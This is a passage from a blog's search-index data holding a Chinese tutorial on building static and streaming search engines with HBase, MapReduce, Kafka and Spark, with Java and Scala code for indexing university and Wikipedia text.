Debug</p>\n","tags":["Flutter"]},{"title":"HBase实现搜索引擎","url":"/2018/12/23/hbase%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/","content":"<h1 id=\"静态搜索引擎\"><a href=\"#静态搜索引擎\" class=\"headerlink\" title=\"静态搜索引擎\"></a>静态搜索引擎</h1><p>上一节已经配置了一个hadoop+spark集群，xuranus@172.17.11.40 为本机，在本机NAT下六个节点：</p>\n<h2 id=\"集群说明\"><a href=\"#集群说明\" class=\"headerlink\" title=\"集群说明\"></a>集群说明</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xuranusMaster@172.16.173.136</span><br><span class=\"line\">xuranusSlave1@172.16.173.137</span><br><span class=\"line\">xuranusSlave2@172.16.173.138</span><br><span class=\"line\">zookeeper001@172.16.173.139</span><br><span class=\"line\">zookeeper002@172.16.173.140</span><br><span class=\"line\">zookeeper003@172.16.173.141</span><br></pre></td></tr></table></figure>\n<p>Hbase部署在172.16.173.136～139上。</p>\n<span id=\"more\"></span>\n<h2 id=\"建表\"><a href=\"#建表\" class=\"headerlink\" title=\"建表\"></a>建表</h2><p>Hbase Shell下创建新表：<code>create ‘school_tb’,’attr’</code></p>\n<p>用<a href=\"https://github.com/s-top/Baike-KnowledgeGraph\">https://github.com/s-top/Baike-KnowledgeGraph</a>提供的百科上爬来的部分大学名录构建表：列族atter包含<code>chinese_name</code>,<code>english_name</code>,<code>famous_alumni</code>,<code>found_time</code>,<code>location</code>,<code>major_department</code>这些属性，学校名字作为rowkey</p>\n<p>插入数据的java代码：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">buildSchoolData</span><span class=\"params\">()</span> </span>&#123;  </span><br><span class=\"line\">    String path = <span class=\"string\">&quot;/home/xuranus/Desktop/hadoop/homework/all.json&quot;</span>;  </span><br><span class=\"line\">    Gson gson = <span class=\"keyword\">new</span> Gson();  </span><br><span class=\"line\">    JsonParser jsonParser = <span class=\"keyword\">new</span> JsonParser();  </span><br><span class=\"line\">    String jsonStr = <span class=\"string\">&quot;&quot;</span>;  </span><br><span class=\"line\">    String lineStr;  </span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;  </span><br><span class=\"line\">        BufferedReader in = <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> FileReader(<span class=\"keyword\">new</span> File(path)));  </span><br><span class=\"line\">        <span class=\"keyword\">while</span>((lineStr = in.readLine())!=<span class=\"keyword\">null</span>) &#123;  </span><br><span class=\"line\">            jsonStr = jsonStr.concat(lineStr);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;  </span><br><span class=\"line\">        e.printStackTrace();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    JsonObject jsonObject = jsonParser.parse(jsonStr).getAsJsonObject();  </span><br><span class=\"line\">  </span><br><span class=\"line\">    JsonArray schools = jsonObject.get(<span class=\"string\">&quot;data&quot;</span>).getAsJsonArray();  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(JsonElement school:schools) &#123;  </span><br><span class=\"line\">        String chinese_name = school.getAsJsonObject().get(<span class=\"string\">&quot;中文名&quot;</span>).getAsString();  </span><br><span class=\"line\">        String location = school.getAsJsonObject().get(<span class=\"string\">&quot;所属地区&quot;</span>).getAsString();  </span><br><span class=\"line\">        String abbreviation = school.getAsJsonObject().get(<span class=\"string\">&quot;简称&quot;</span>).getAsString();  </span><br><span class=\"line\">        String major_department = school.getAsJsonObject().get(<span class=\"string\">&quot;主要院系&quot;</span>).getAsString();  </span><br><span class=\"line\">        String found_time = school.getAsJsonObject().get(<span class=\"string\">&quot;创办时间&quot;</span>).getAsString();  </span><br><span class=\"line\">        String english_name = school.getAsJsonObject().get(<span class=\"string\">&quot;英文名&quot;</span>).getAsString();  </span><br><span class=\"line\">        String famous_alumni = school.getAsJsonObject().get(<span class=\"string\">&quot;知名校友&quot;</span>).getAsString();  </span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;chinese_name&quot;</span>, chinese_name);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;location&quot;</span>, location);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;abbreviation&quot;</span>, abbreviation);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;major_department&quot;</span>, major_department);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;found_time&quot;</span>, found_time);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;english_name&quot;</span>, english_name);  </span><br><span class=\"line\">            put(<span class=\"string\">&quot;school_tb&quot;</span>, chinese_name, <span class=\"string\">&quot;attr&quot;</span>, <span class=\"string\">&quot;famous_alumni&quot;</span>, famous_alumni);  </span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;  </span><br><span class=\"line\">            e.printStackTrace();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h2><p>划分中文单词，统计词频建立索引：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test3</span> </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Configuration conf;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(String tablename,String row, String columnFamily,String column,String data)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;  </span><br><span class=\"line\">        HTable table = <span class=\"keyword\">new</span> HTable(Test3.conf, tablename);  </span><br><span class=\"line\">        Put p1=<span class=\"keyword\">new</span> Put(Bytes.toBytes(row));  </span><br><span class=\"line\">        p1.add(Bytes.toBytes(columnFamily), Bytes.toBytes(column), Bytes.toBytes(data));  </span><br><span class=\"line\">        table.put(p1);  </span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;put &#x27;&quot;</span>+row+<span class=\"string\">&quot;&#x27;,&#x27;&quot;</span>+columnFamily+<span class=\"string\">&quot;:&quot;</span>+column+<span class=\"string\">&quot;&#x27;,&#x27;&quot;</span>+data+<span class=\"string\">&quot;&#x27;&quot;</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TokenizerMapper</span> <span class=\"keyword\">extends</span> <span class=\"title\">TableMapper</span>&lt;<span class=\"title\">Text</span>, <span class=\"title\">Text</span>&gt; </span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">private</span> Text word = <span class=\"keyword\">new</span> Text();  </span><br><span class=\"line\">        <span class=\"keyword\">private</span> Text valueInfo = <span class=\"keyword\">new</span> Text(); <span class=\"comment\">//存储词频  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">map</span><span class=\"params\">(ImmutableBytesWritable key, Result value, Context context)</span> <span class=\"keyword\">throws</span> IOException, InterruptedException </span>&#123;  </span><br><span class=\"line\">            List&lt;Cell&gt; cs = value.listCells();  </span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Cell cell : cs) &#123;  </span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] bt = cell.getValue();  </span><br><span class=\"line\">                InputStream ip = <span class=\"keyword\">new</span> ByteArrayInputStream(bt);  </span><br><span class=\"line\">                Reader read = <span class=\"keyword\">new</span> InputStreamReader(ip);  </span><br><span class=\"line\">                IKSegmenter iks = <span class=\"keyword\">new</span> IKSegmenter(read, <span class=\"keyword\">true</span>);  </span><br><span class=\"line\">                Lexeme t;  </span><br><span class=\"line\">  </span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((t = iks.next()) != <span class=\"keyword\">null</span>) &#123;  </span><br><span class=\"line\">                    String rowkey = <span class=\"keyword\">new</span> String(key.get());  </span><br><span class=\"line\">                    word.set(t.getLexemeText().concat(<span class=\"string\">&quot;:&quot;</span>).concat(rowkey));  </span><br><span class=\"line\">                    valueInfo.set(<span class=\"string\">&quot;1&quot;</span>);  </span><br><span class=\"line\">                    context.write(word, valueInfo);  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvertedIndexCombiner</span> <span class=\"keyword\">extends</span> <span class=\"title\">Reducer</span>&lt;<span class=\"title\">Text</span>, <span class=\"title\">Text</span>, <span class=\"title\">Text</span>, <span class=\"title\">Text</span>&gt;</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">private</span> Text info = <span class=\"keyword\">new</span> Text();  </span><br><span class=\"line\">        <span class=\"meta\">@Override</span>  </span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">reduce</span><span class=\"params\">(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context)</span>  </span></span><br><span class=\"line\"><span class=\"function\">                <span class=\"keyword\">throws</span> IOException, InterruptedException </span>&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;  </span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Text value : values) &#123;  </span><br><span class=\"line\">                sum += Integer.parseInt(value.toString() );  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">            <span class=\"keyword\">int</span> splitIndex = key.toString().indexOf(<span class=\"string\">&quot;:&quot;</span>);  </span><br><span class=\"line\">            info.set( key.toString().substring( splitIndex + <span class=\"number\">1</span>) +<span class=\"string\">&quot;:&quot;</span>+sum );  </span><br><span class=\"line\">            key.set( key.toString().substring(<span class=\"number\">0</span>,splitIndex));  </span><br><span class=\"line\">            context.write(key, info);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvertedIndexReducer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Reducer</span>&lt;<span class=\"title\">Text</span>, <span class=\"title\">Text</span>, <span class=\"title\">Text</span>, <span class=\"title\">Text</span>&gt;</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">private</span> Text result = <span class=\"keyword\">new</span> Text();  </span><br><span class=\"line\">        <span class=\"meta\">@Override</span>  </span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">reduce</span><span class=\"params\">(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context)</span>  <span class=\"keyword\">throws</span> IOException, InterruptedException </span>&#123;  </span><br><span class=\"line\">            <span class=\"comment\">//生成文档列表  </span></span><br><span class=\"line\">            String fileList = <span class=\"keyword\">new</span> String();  </span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Text value : values) &#123;  </span><br><span class=\"line\">                fileList += value.toString()+<span class=\"string\">&quot;;&quot;</span>;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">            result.set(fileList);  </span><br><span class=\"line\">            context.write(key, result);  </span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;  </span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;-------InvertedIndexReducer-------&quot;</span>);  </span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;key=&quot;</span>+key.toString());  </span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;value=&quot;</span>+fileList);  </span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;----------------------------------&quot;</span>);  </span><br><span class=\"line\">                put(<span class=\"string\">&quot;keyword_map&quot;</span>,key.toString(),<span class=\"string\">&quot;cf&quot;</span>,<span class=\"string\">&quot;data&quot;</span>,fileList);  </span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;  </span><br><span class=\"line\">                e.printStackTrace();  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;  </span><br><span class=\"line\">        System.setProperty(<span class=\"string\">&quot;HADOOP_USER_NAME&quot;</span>, <span class=\"string\">&quot;root&quot;</span>);  </span><br><span class=\"line\">        System.setProperty(<span class=\"string\">&quot;hadoop.home.dir&quot;</span>,<span class=\"string\">&quot;/home/xuranus/Desktop/hadoop/hadoop-2.7.6&quot;</span>);  </span><br><span class=\"line\">        conf = <span class=\"keyword\">new</span> Configuration();  </span><br><span class=\"line\">        String tablename=<span class=\"string\">&quot;school_tb&quot;</span>;  </span><br><span class=\"line\">        String columnFamily=<span class=\"string\">&quot;attr&quot;</span>;  </span><br><span class=\"line\">        conf.set(<span class=\"string\">&quot;hbase.zookeeper.quorum&quot;</span>,<span class=\"string\">&quot;zookeeper001,zookeeper002,zookeeper003&quot;</span>);  </span><br><span class=\"line\">        conf.set(<span class=\"string\">&quot;hbase.zookeeper.property.clientPort&quot;</span>, <span class=\"string\">&quot;2181&quot;</span>);  </span><br><span class=\"line\">        conf.set(<span class=\"string\">&quot;hbase.master&quot;</span>, <span class=\"string\">&quot;172.16.173.136:16000&quot;</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        conf.addResource(<span class=\"string\">&quot;/home/xuranus/hdfs-site.xml&quot;</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Job job = Job.getInstance(conf, <span class=\"string\">&quot;word count&quot;</span>);  </span><br><span class=\"line\">        job.setJarByClass(Test3.class);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Scan scan = <span class=\"keyword\">new</span> Scan();  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;chinese&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;location&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;abbreviation&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;major_department&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;found_time&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;english_name&quot;</span>));  </span><br><span class=\"line\">        scan.addColumn(Bytes.toBytes(columnFamily), Bytes.toBytes(<span class=\"string\">&quot;famous_alumni&quot;</span>));  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">        TableMapReduceUtil.initTableMapperJob(tablename, scan, TokenizerMapper.class,Text.class,  Text.class, job);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        job.setMapOutputKeyClass(Text.class);  </span><br><span class=\"line\">        job.setMapOutputValueClass(Text.class);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        job.setCombinerClass(InvertedIndexCombiner.class);  </span><br><span class=\"line\">        job.setReducerClass(InvertedIndexReducer.class);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        job.setOutputKeyClass(Text.class);  </span><br><span class=\"line\">        job.setOutputValueClass(Text.class);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        FileOutputFormat.setOutputPath(job, <span class=\"keyword\">new</span> Path(<span class=\"string\">&quot;hdfs://172.16.173.136:9000/output&quot;</span>));  </span><br><span class=\"line\">        System.exit(job.waitForCompletion(<span class=\"keyword\">true</span>) ? <span class=\"number\">0</span> : <span class=\"number\">1</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure></p>\n<p>Ouput目录输出如下:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1902年\t东南大学:1;北京师范大学:1;南京大学:1;</span><br><span class=\"line\">1903年\t中南大学:1;湖南大学:1;</span><br><span class=\"line\">1905年\t中国农业大学:1;复旦大学:1;</span><br><span class=\"line\">1907年\t同济大学:1;</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"界面和查询\"><a href=\"#界面和查询\" class=\"headerlink\" title=\"界面和查询\"></a>界面和查询</h2><p>查询做成了一个java web程序，后端springboot，接收输入关键词，在索引表中查找，返回词条索引字符串，拆分字符串做处理，在school_tb中查询每个键，把结果存成数组以json形式发到前端。</p>\n<p>react做前端接受结果做渲染，用正则表达式高亮关键字，效果如下：</p>\n<p><img src=\"Screenshot_20190304_083725.png\" alt=\"\"></p>\n<p>自此，一个简单的wordcount搜索引擎就实现了。但是，这只能给静态的资源提供搜索，进一步的，我们可以用spark实现动态增加词条资源。</p>\n<h1 id=\"动态搜索引擎\"><a href=\"#动态搜索引擎\" class=\"headerlink\" title=\"动态搜索引擎\"></a>动态搜索引擎</h1><h2 id=\"集群说明-1\"><a href=\"#集群说明-1\" class=\"headerlink\" title=\"集群说明\"></a>集群说明</h2><p>一共有6个节点<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xuranusMaster:172.16.173.136</span><br><span class=\"line\">xuranusSlave1:172.16.173.137</span><br><span class=\"line\">xuranusSlave2:172.16.173.138</span><br><span class=\"line\"></span><br><span class=\"line\">zookeeper001:172.16.173.139</span><br><span class=\"line\">zookeeper002:172.16.173.140</span><br><span class=\"line\">zookeeper003:172.16.173.141</span><br></pre></td></tr></table></figure></p>\n<p>其中服务的分布：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hadoop:xuranusMaster xuranusSlave1 xuranusSlave2</span><br><span class=\"line\">Hbase:xuranusMaster xuranusSlave1 xuranusSlave2</span><br><span class=\"line\">Zookeeper:zookeeper001 zookeeper002 zookeeper003</span><br><span class=\"line\">spark:xuranusMaster xuranusSlave1 xuranusSlave2</span><br><span class=\"line\">kafka:xuranusMaster xuranusSlave1 xuranusSlave2</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"算法说明\"><a href=\"#算法说明\" class=\"headerlink\" title=\"算法说明\"></a>算法说明</h2><p>本次实验用kafka+spark-streaming搭建了一个实时流式计算集群。</p>\n<p>先从wikipedia上下了10多篇关于编程语言的文章存储在本地，用scala写了一个kafka生产者，读取文件，并向消息队列发送文本(每隔2s发送一次，模拟爬虫)。</p>\n<p>生产者：KafkaProducerThread.scala</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">KafkaProducerThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;  </span><br><span class=\"line\">  <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span></span>():<span class=\"type\">Unit</span> = &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> topic = <span class=\"string\">&quot;test&quot;</span>  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> brokers = <span class=\"string\">&quot;xuranusMaster:9092,xuranusSlave1:9092,xuranusSlave2:9092&quot;</span>  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> props = <span class=\"keyword\">new</span> <span class=\"type\">Properties</span>()  </span><br><span class=\"line\">    props.put(<span class=\"string\">&quot;bootstrap.servers&quot;</span>, brokers)  </span><br><span class=\"line\">    props.put(<span class=\"string\">&quot;group.id&quot;</span>, <span class=\"string\">&quot;xuranus&quot;</span>)  </span><br><span class=\"line\">    props.put(<span class=\"string\">&quot;client.id&quot;</span>, <span class=\"string\">&quot;ScalaProducerExample&quot;</span>)  </span><br><span class=\"line\">    props.put(<span class=\"string\">&quot;key.serializer&quot;</span>, <span class=\"string\">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>)  </span><br><span class=\"line\">    props.put(<span class=\"string\">&quot;value.serializer&quot;</span>, <span class=\"string\">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> producer = <span class=\"keyword\">new</span> <span class=\"type\">KafkaProducer</span>[<span class=\"type\">String</span>, <span class=\"type\">String</span>](props)  </span><br><span class=\"line\">  </span><br><span class=\"line\">    println(<span class=\"string\">&quot;Start sent simulate.&quot;</span>)  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i &lt;- <span class=\"number\">1</span> to <span class=\"number\">14</span>) &#123;  </span><br><span class=\"line\">      <span class=\"keyword\">val</span> fileName = <span class=\"string\">&quot;/home/xuranus/spark_homework/article/&quot;</span> + i + <span class=\"string\">&quot;.txt&quot;</span> <span class=\"comment\">//读取文件 写入消息队列  </span></span><br><span class=\"line\">      <span class=\"keyword\">val</span> source = <span class=\"type\">Source</span>.fromFile(fileName)  </span><br><span class=\"line\">      <span class=\"keyword\">val</span> str = source.mkString  </span><br><span class=\"line\">      <span class=\"keyword\">val</span> record = <span class=\"keyword\">new</span> <span class=\"type\">ProducerRecord</span>[<span class=\"type\">String</span>, <span class=\"type\">String</span>](topic,fileName , str)  </span><br><span class=\"line\">      producer.send(record)  </span><br><span class=\"line\">      println(<span class=\"string\">&quot;produced &quot;</span> + i + <span class=\"string\">&quot; articles!&quot;</span>)  </span><br><span class=\"line\">      <span class=\"type\">Thread</span>.sleep(<span class=\"number\">2000</span>) <span class=\"comment\">// 2s一次  </span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    producer.close()  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n<p>streaming作为kafka消费者从消息队列拿key（存储目录）和value（文本内容）。在每个RDD接受到的数据中，先用正则匹配去除符号，清洗数据，然后分割统计词频建立所有存储到hbase</p>\n<p>消费者 KafkaStreamingConsumer.scala文件</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">KafkaStreamingConsumer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;  </span><br><span class=\"line\">  <span class=\"type\">Logger</span>.getLogger(<span class=\"string\">&quot;org&quot;</span>).setLevel(<span class=\"type\">Level</span>.<span class=\"type\">OFF</span>)<span class=\"comment\">//关闭无关输出  </span></span><br><span class=\"line\">  <span class=\"type\">Logger</span>.getLogger(<span class=\"string\">&quot;akka&quot;</span>).setLevel(<span class=\"type\">Level</span>.<span class=\"type\">OFF</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"meta\">@transient</span>  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">insert</span></span>(word:<span class=\"type\">String</span>,index:<span class=\"type\">String</span>,count:<span class=\"type\">String</span>): <span class=\"type\">Unit</span> =&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> conf = <span class=\"type\">HBaseConfiguration</span>.create()  </span><br><span class=\"line\">    conf.set(<span class=\"string\">&quot;hbase.zookeeper.property.clientPort&quot;</span>, <span class=\"string\">&quot;2181&quot;</span>)  </span><br><span class=\"line\">    conf.set(<span class=\"string\">&quot;hbase.zookeeper.quorum&quot;</span>, <span class=\"string\">&quot;zookeeper001,zookeeper002,zookeeper003&quot;</span>)  </span><br><span class=\"line\">    conf.set(<span class=\"string\">&quot;hbase.master&quot;</span>, <span class=\"string\">&quot;xuranusMaster:16000&quot;</span>)  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> connection = <span class=\"type\">ConnectionFactory</span>.createConnection(conf)  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> admin = connection.getAdmin()  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> table = connection.getTable(<span class=\"type\">TableName</span>.valueOf(<span class=\"string\">&quot;articles&quot;</span>))  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> theput= <span class=\"keyword\">new</span> <span class=\"type\">Put</span>(<span class=\"type\">Bytes</span>.toBytes(word))  </span><br><span class=\"line\">    theput.addColumn(<span class=\"type\">Bytes</span>.toBytes(<span class=\"string\">&quot;articlesCF&quot;</span>), <span class=\"type\">Bytes</span>.toBytes(index), <span class=\"type\">Bytes</span>.toBytes(count))  </span><br><span class=\"line\">    table.put(theput)  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span></span>()= &#123;  </span><br><span class=\"line\">    <span class=\"type\">System</span>.setProperty(<span class=\"string\">&quot;hadoop.home.dir&quot;</span>, <span class=\"string\">&quot;/home/xuranus/Desktop/hadoop/hadoop-2.7.6&quot;</span>)  </span><br><span class=\"line\">    <span class=\"type\">System</span>.setProperty(<span class=\"string\">&quot;log4j.rootCategory&quot;</span>, <span class=\"string\">&quot;ERROR&quot;</span>)  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> conf = <span class=\"keyword\">new</span> <span class=\"type\">SparkConf</span>().setAppName(<span class=\"string\">&quot;app&quot;</span>).setMaster(<span class=\"string\">&quot;local[*]&quot;</span>)  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> ssc = <span class=\"keyword\">new</span> <span class=\"type\">StreamingContext</span>(conf,<span class=\"type\">Seconds</span>(<span class=\"number\">2</span>))  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> kafkaParam = <span class=\"type\">Map</span>(  </span><br><span class=\"line\">      <span class=\"string\">&quot;metadata.broker.list&quot;</span> -&gt; <span class=\"string\">&quot;xuranusMaster:9092,xurausSlave01:9092,xuranusSlave2:9092&quot;</span>,  </span><br><span class=\"line\">      <span class=\"string\">&quot;bootstrap.servers&quot;</span> -&gt; <span class=\"string\">&quot;xuranusMaster:9092&quot;</span>,  </span><br><span class=\"line\">      <span class=\"string\">&quot;key.deserializer&quot;</span> -&gt; classOf[<span class=\"type\">StringDeserializer</span>],  </span><br><span class=\"line\">      <span class=\"string\">&quot;value.deserializer&quot;</span> -&gt; classOf[<span class=\"type\">StringDeserializer</span>],  </span><br><span class=\"line\">      <span class=\"string\">&quot;auto.offset.reset&quot;</span> -&gt; <span class=\"string\">&quot;earliest&quot;</span>,  </span><br><span class=\"line\">      <span class=\"string\">&quot;group.id&quot;</span> -&gt; <span class=\"string\">&quot;tweet-consumer&quot;</span>  </span><br><span class=\"line\">    )  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> preferredHosts = <span class=\"type\">LocationStrategies</span>.<span class=\"type\">PreferConsistent</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">val</span> topics = <span class=\"type\">Array</span>(<span class=\"string\">&quot;test&quot;</span>)  </span><br><span class=\"line\">    <span class=\"comment\">//    获取日志数据  </span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> stream =  </span><br><span class=\"line\">      <span class=\"type\">KafkaUtils</span>.createDirectStream[<span class=\"type\">String</span>, <span class=\"type\">String</span>](  </span><br><span class=\"line\">      ssc,  </span><br><span class=\"line\">      preferredHosts,  </span><br><span class=\"line\">      <span class=\"type\">ConsumerStrategies</span>.<span class=\"type\">Subscribe</span>[<span class=\"type\">String</span>, <span class=\"type\">String</span>](topics, kafkaParam)  </span><br><span class=\"line\">    )  </span><br><span class=\"line\">  </span><br><span class=\"line\">    stream.map(record=&gt;(record.key().toString,record.value().toString))  </span><br><span class=\"line\">      .foreachRDD(rdd=&gt;&#123;  </span><br><span class=\"line\">      rdd.foreachPartition(partition=&gt;&#123;  </span><br><span class=\"line\">        partition.foreach(s=&gt;&#123;  </span><br><span class=\"line\">          <span class=\"keyword\">val</span> path = s._1  </span><br><span class=\"line\">          <span class=\"keyword\">val</span> content = s._2  </span><br><span 